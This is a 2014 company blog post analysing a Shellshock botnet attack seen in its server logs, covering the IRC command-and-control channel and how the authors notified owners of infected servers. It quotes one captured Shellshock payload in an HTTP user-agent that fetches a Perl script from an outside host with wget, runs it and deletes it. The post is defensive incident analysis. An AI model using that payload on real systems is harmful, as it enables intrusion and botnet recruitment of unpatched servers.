---
layout: post
title: Anatomy of a Shellshock botnet
date: '2014-10-23T15:10:00+03:00'
tags:
- shellshock
- cloud computing
- botnet
tumblr_url: https://blog.mist.io/post/100582053116/anatomy-of-a-shellshock-botnet
---
[Shellshock](http://en.wikipedia.org/wiki/Shellshock_(software_bug)) (aka Bashdoor) is a family of security vulnerabilities disclosed on September 24 that affected the very popular Bash shell. The first bug discovered, caused Bash to unintentionally execute commands when they were concatenated to the end of function definitions stored in the values of environment variables. Within days of the publication of this, intense scrutiny of the underlying design flaws discovered a variety of related vulnerabilities, which were addressed with a series of patches.

![image](/assets/tumblr-images/tumblr_inline_ndw0crN1zB1rgqrs8.jpg)

_(image by&nbsp;[Aaron Kondziela](http://aaronkondziela.com/2014/09/shellshock-logo-for-bash-vulnerability/) under&nbsp;CC BY 4.0)_

Attackers exploited Shellshock within hours of the initial disclosure by creating botnets of compromised computers to perform distributed denial-of-service attacks and vulnerability scanning. Our business is server management and monitoring, so naturally we were bound to witness some of these attacks.

Of course, our own servers were patched within hours of the announcement. That, however, didn’t stop people from launching the attacks. We take security very seriously and every exception that happens in Mist.io is documented and sent to our security team. On September 29, we started seeing several “HTTPNotFound: /cgi-bin/bash” exceptions and although our servers were patched, we decided to look into it and try to figure out what the attack plan was.

This is what we were looking at:

    Sep 29 2014, 20:18 UTC
    HTTP GET (from 174.143.168.121)
    path_info: /cgi-bin/bash
    user_agent: () { :;}; /bin/bash -c "wget ellrich.com/legend.txt -O  /tmp/.apache;killall -9 perl;perl /tmp/.apache;rm -rf /tmp/.apache"

Naturally, our first step was to take a look at that legend.txt script. Well, it turns out it was a [perl script](http://pastebin.com/MRb25xsc) used to scan for vulnerabilities and connect the compromised server to a command and control IRC server.&nbsp;Eventually, it tries to set up a SOCKS5 server (mocks) and if it succeeds, it sends the connection url via a private message in IRC.

Next step was to connect to that IRC server. At the time, 272 infected servers were connected to the IRC #apache channel with nicks like APACHE-4366394. There were 3 admins online, one of them using the very unique and modest nickname “god”. We chased the IP addresses of the admins, but as expected that did not yield any significant results. The IRC server’s IP originated in a Slicehost pool, and soon enough, that server was going down.

As the compromised servers were connected directly to the IRC server, we decided to collect their IP addresses, try to find their respective owners and inform them that their servers have been compromised.

Being the only non-bot users on that IRC channel, the operator kept kicking and banning us. Well, kick banning did not work in the 90’s, it sure wasn’t going to work now. After collecting the infected IPs, we started doing reverse lookups. Fortunattely, none of the IPs seemed to be [high-profile targets like Yahoo](http://www.futuresouth.us/wordpress/?p=5).

In the end of the day, we informed the hosting companies and eventually got to some of the owners. At least our efforts did not go in vain. Overall, it seemed like a pretty standard type of attack that would have been prevented if the compromised servers had been properly patched. Keep in mind that it had already been five days since the disclosure of Shellshock and it was featured in all major news networks.

Even if your server’s data are not important or it is a test server that you don’t care about, leaving it unpatched can make it part of a larger DDOS attack. Keeping your machines updated is crucial in fighting off the creation and expansion of malicious botnets.

**Do you have machines across clouds and want to easily manage them?&nbsp;[Sign up for Mist.io and try it for free!](https://mist.io/)**

